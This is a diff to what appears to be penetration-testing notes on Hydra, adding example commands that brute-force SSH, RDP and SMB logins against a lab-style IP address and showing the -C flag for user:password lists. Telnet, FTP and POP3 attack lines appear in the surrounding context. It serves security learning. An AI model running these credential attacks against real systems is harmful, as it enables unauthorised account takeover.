@@ -19,10 +19,18 @@ Hydra can attack nearly 50 services including: Cisco auth, FTP, HTTP, IMAP, RDP,
 ```bash
 # Main syntax:
 hydra -L users.txt -P pass.txt <service://server> <options>
+# Example:
+# hydra -L user.list -P password.list ssh://10.129.42.197
+# hydra -L user.list -P password.list rdp://10.129.42.197
+# hydra -L user.list -P password.list smb://10.129.42.197
+
+# If we use a file with credentials in this format "user:password" we might use the flag -C
+hydra -C <user_pass.list> <protocol>://<IP>
+# Example: 
+# hydra -C user_pass.list ssh://10.129.42.197
 
 # Get information about a module
 hydra -U rdp 
-
 
 # Attack a telnet service
 hydra -L users.txt -P pass.txt telnet://target.server  
@@ -62,6 +70,8 @@ hydra -L users.txt -P pass.txt ftp://$ip:2121
 
 # Attacking a pop3 service
 hydra -L users.txt -p 'Company01!' -f $ip pop3
+
+
 
 ```
 
